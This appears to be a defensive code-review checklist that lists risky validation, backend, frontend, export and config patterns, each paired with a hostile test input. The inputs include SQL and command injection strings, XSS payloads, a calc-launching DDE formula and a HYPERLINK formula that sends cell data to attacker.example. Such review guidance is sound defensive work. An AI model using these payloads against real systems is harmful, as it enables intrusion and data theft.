# Stack checklist (walk only the categories that fit the detected stack)

Each item: **look for** / *hostile input*. Parenthesised names are examples, not assumptions. Always assume the attacker bypasses the client and calls the backend or function directly.

Contents: Validation · Dates · Backend/data · Relational vs document · Frontend · Exports · Auth/secrets · Infra/deps · Domain rules · Severity rubric · Worked examples

## 1. Validation and parsing
- **Schemas that accept anything** (Zod `z.any()` / `.passthrough()`, Pydantic `Any`, Joi `.unknown()`, JSON Schema `additionalProperties: true`). *Send extra keys, wrong types, nested objects, `__proto__`.*
- **No max length** on strings and arrays. *2 MB string, 100k-element array.*
- **Client/server limit mismatch** (input `maxLength` but no server bound). *Call the API directly with a longer value.*
- **String methods on non-strings** (`.trim()`, `.toUpperCase()` after a falsy-only guard). *Number, boolean, object, array.*
- **Loose substring matching as an allow-list** (`list.includes(x)` on a string, `'ABC'.includes(input)`). *Empty string, a substring of a valid value.*
- **Normalizers that fall back to the raw input** (`return clean(x) ?? x`). *Input the cleaner rejects.*

## 2. Dates and time
- **Non-ISO strings parsed by local-time constructors** (JS `new Date(string)`, naive `datetime.strptime`). *`10/27/2026`, `27/10/2026`.*
- **Convert to UTC then slice the date** (`toISOString().slice(0,10)`), or mix local and UTC getters. *A local-midnight date in a positive-offset zone.*
- **Unbounded strings reaching date parsers.** *2 MB string.*
- Rule: every date fix is executed under `UTC`, a positive-offset zone (for example `Asia/Manila`) and a negative-offset zone (for example `America/Los_Angeles`). Use `fuzz-pure-fn.mjs --date-roundtrip`.

## 3. Backend and data access
- **Mass assignment**: request body written straight to a JSON/JSONB column or ORM model. *Extra keys, huge nested objects.*
- **Raw SQL built by interpolation.** *`' OR 1=1--`.*
- **New routes without authentication or authorization**; check against the middleware names detected in the repo. *Call with no token, another user's token.*
- **Missing tenant/owner scoping** (IDOR). *Another tenant's ID in the path or body.*
- **Unbounded queries** (no limit, user-controlled page size). *`limit=1000000`.*
- **Unhandled errors / error messages leaking internals** (stack, SQL, paths). *Input that makes the handler throw.*
- **SSRF** in URL fetchers. *Internal address, metadata endpoint, redirect to internal host.*
- **Path traversal** in file access. *`../../x`, absolute path, null byte.*
- **Command injection** in process spawning. *`; id`, `$(id)`, argument starting with `-`.*
- **Unsafe deserialization** (`pickle.loads`, `yaml.load`, `unserialize`). *Crafted payload object.*
- **Stored-poison read paths**: a bad value written once that crashes every later read (list/detail endpoints, exports, dashboards). *Write the poisoned value, then trace every reader of that column.*

## 4. Relational vs document consistency
- Data skipped from constrained tables but kept in JSON columns; reports and exports then miss it, or the two copies drift. *Submit a value that passes the JSON write but fails the relational insert; check what each report counts.*

## 5. Frontend
- **Raw HTML sinks** (`dangerouslySetInnerHTML`, `innerHTML`, `v-html`). *`<img src=x onerror=...>`.*
- **`href`/`src` built from user data.** *`javascript:alert(1)`.*
- **Missing `maxLength`**; but remember the server must also enforce it.
- **Defaults like `value || 'X'`** that can violate a domain rule. *Empty selection.*
- **Null/undefined coercion in mappers** (`Number(null)` is 0, `String(undefined)`). *Missing field from the API.*
- **Errors swallowed** so the user sees nothing (`catch {}`). *Server 4xx/5xx.*
- **Tokens in `localStorage`.** *Any XSS reads them.*

## 6. Exports (spreadsheet / CSV / PDF)
- **Formula injection**: cells starting with `=`, `+`, `-`, `@`, tab or carriage return. *`=HYPERLINK(...)`, `=cmd|' /C calc'!A0`.*
- The sanitizer belongs in the export layer (every cell written), not the input layer, because data may already be stored.

## 7. Auth and secrets
- Hardcoded credentials; weak token handling (no expiry, predictable); missing CSRF protection on cookie auth; permissive CORS (`*` with credentials); logging PII or tokens. *Search the diff; mask values in the report.*

## 8. Infra, config and dependencies
- Secrets in the diff; new env vars without validation or documentation; container/proxy/CI changes (exposed ports, `latest` tags, `curl | sh`); new dependencies (typosquatting, install scripts, unpinned versions).

## 9. Domain rules
- Cross-check changed logic against the standards files found in step 3 and cite file and section. If no standards file exists, say so; do not invent one.

## Severity rubric
- **CRITICAL**: remotely triggerable, persistent (data bricked or authorization bypass) with no special access.
- **HIGH**: remotely triggerable crash or silent data corruption.
- **MEDIUM**: needs a user action or a specific role, or blocks workflows.
- **LOW**: hardening.
- **INFO**: observation.

## Worked examples (generalized)

1. **Date day-shift.** Pattern: `new Date(str)` then `toISOString().slice(0,10)`. Hostile input: `10/27/2026` under `Asia/Manila` (parsed as local midnight, UTC date is the 26th). Impact: every saved date is one day early for some users. Fix idea: parse the components explicitly (regex or split) and build the date with `Date.UTC`, or return the matched `YYYY-MM-DD`; execute under UTC, Manila and Los_Angeles.
2. **Type guard that only checks falsiness.** Pattern: `if (!v) return; v.trim()`. Hostile input: `123` or `{}` sent directly to the API. Impact: `TypeError` -> HTTP 500 for any caller. Fix idea: `typeof v === 'string'` guard (or schema type) before string methods.
3. **Unvalidated field in a JSON column -> permanent read-path 500.** Pattern: schema `any` field persisted to a JSONB column and later mapped by a reader that assumes an array of strings. Hostile input: `{"items": 5}` once. Impact: every later GET of that record throws, data is bricked until manual repair. Fix idea: strict schema with bounds on write, plus a defensive reader that tolerates bad stored data.
4. **Free text into a spreadsheet export.** Pattern: user-supplied title written to a cell verbatim. Hostile input: `=HYPERLINK("http://attacker.example/?"&A1,"x")`. Impact: formula runs when an admin opens the export. Fix idea: in the export layer, prefix a single quote (or tab) to cells starting with `= + - @ \t \r`.
5. **`value || 'DEFAULT'` violating a domain rule.** Pattern: `fund = form.fund || 'NATIONAL'`. Hostile input: empty/absent field. Impact: records are silently classified into a category the rules forbid for that case. Fix idea: no silent default; require the field or derive it from the rule matrix, and reject otherwise.
